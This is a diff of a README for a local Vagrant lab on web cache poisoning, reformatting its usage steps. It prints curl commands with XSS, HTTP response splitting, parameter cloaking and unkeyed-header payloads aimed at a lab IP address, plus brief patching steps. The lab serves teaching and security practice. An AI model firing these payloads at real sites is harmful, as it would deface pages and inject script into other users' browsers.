@@ -1,4 +1,5 @@
 # Cache Poisoning Lab
+
 ***Abioye Oyatoye***
 
 This project is a Vagrant-based local lab designed to explore cache poisoning vulnerabilities, exploit them, and learn how to patch them. It simulates a web application stack with a web server, caching server, load balancer, and attacker machine, providing hands-on experience with cybersecurity concepts like cache key manipulation, HTTP response splitting, and parameter cloaking.
@@ -80,28 +81,51 @@ Access the Components:
 Usage
 Exploring Vulnerabilities
 
-Cache Key Manipulation:
-    From the attacker VM: curl -H "Host: example.com" "<http://192.168.50.30/dynamic.php?user=><script>alert('Hacked')</script>"
-    Test as victim: curl <http://192.168.50.30/dynamic.php>
-HTTP Response Splitting:
-    curl -H "Host: example.com" "<http://192.168.50.30/dynamic.php?user=Alice%0d%0aContent-Length:%200%0d%0a%0d%0a><h1>Defaced!</h1>"
-Parameter Cloaking:
-    curl -H "Host: example.com" "<http://192.168.50.30/dynamic.php?user=Normal;user=><script>alert('XSS')</script>"
-Unkeyed Headers:
-    curl -H "Host: example.com" -H "Accept-Encoding: gzip" "<http://192.168.50.30/dynamic.php?user=><h1>Poisoned</h1>"
+**Cache Key Manipulation:**
 
-Patching Vulnerabilities
+1. From the attacker VM
+
+```bash
+curl -H "Host: example.com" "<http://192.168.50.30/dynamic.php?user=><script>alert('Hacked')</script>"
+```
+
+2. Test as victim
+
+```bash
+curl "http://192.168.50.30/dynamic.php"
+```
+
+3. HTTP Response Splitting
+
+```bash
+curl -H "Host: example.com" "<http://192.168.50.30/dynamic.php?user=Alice%0d%0aContent-Length:%200%0d%0a%0d%0a><h1>Defaced!</h1>"
+```
+
+4. Parameter Cloaking
+
+```bash
+curl -H "Host: example.com" "<http://192.168.50.30/dynamic.php?user=Normal;user=><script>alert('XSS')</script>"
+```
+
+5. Unkeyed Headers
+
+```bash
+curl -H "Host: example.com" -H "Accept-Encoding: gzip" "<http://192.168.50.30/dynamic.php?user=><h1>Poisoned</h1>"
+```
+
+## Patching Vulnerabilities
+
+There is another whole section one fixing the vulnerabilities, the link to the repository holding the vagrant with the patched vulnerabilities can be cloned from [here]()
 
 Re-provision VMs with updated configs:
 
 ```bash
-
 vagrant provision web
 vagrant provision cache
 vagrant provision lb
 ```
 
-Retest attacks to verify fixes (see configuration details in the Vagrantfile).
+Retest attacks to verify fixes (see configuration details in the Vagrantfile) - from the link above.
 
 Files
 
